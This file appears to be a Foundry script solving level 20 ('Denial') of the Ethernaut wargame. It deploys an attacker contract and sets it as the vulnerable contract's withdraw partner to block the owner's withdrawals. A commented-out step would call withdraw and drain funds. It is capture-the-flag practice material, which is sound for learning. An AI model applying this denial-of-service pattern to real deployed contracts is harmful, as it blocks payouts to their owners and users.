// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IDenial } from "ethernaut/20-denial/IDenial.sol";
import { DenialAttacker } from "ethernaut/20-denial/DenialAttacker.sol";

contract DenialScript is Script {
    event WithdrawalFailed(bytes reason);
    event WithdrawalSucceeded();

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address denialAddr = vm.envAddress("L20_DENIAL_ADDRESS");
        IDenial denial = IDenial(payable(denialAddr));

        // Step 1: deploy attacker
        DenialAttacker denialAttacker = new DenialAttacker();

        // Step 2: set up attacker as partner
        denial.setWithdrawPartner(address(denialAttacker));

        // NB: do not execute step 3 on the blockchain if you want to pass the level, as `DenialAttacker` will withdraw
        // almost all the funds (which are required to pass the level).
        // Step 3: withdraw
        // address owner = denial.owner();
        // console.log("*** Balances before");
        // console.logUint(address(denial).balance);
        // console.logUint(owner.balance);
        // console.logUint(address(denialAttacker).balance);

        // try denial.withdraw{gas: 1_000_000}() {
        //     emit WithdrawalSucceeded();
        // } catch (bytes memory reason) {
        //     emit WithdrawalFailed(reason);
        // }
        // console.log("*** Balances after");
        // console.logUint(address(denial).balance);
        // console.logUint(owner.balance);
        // console.logUint(address(denialAttacker).balance);

        vm.stopBroadcast();
    }
}
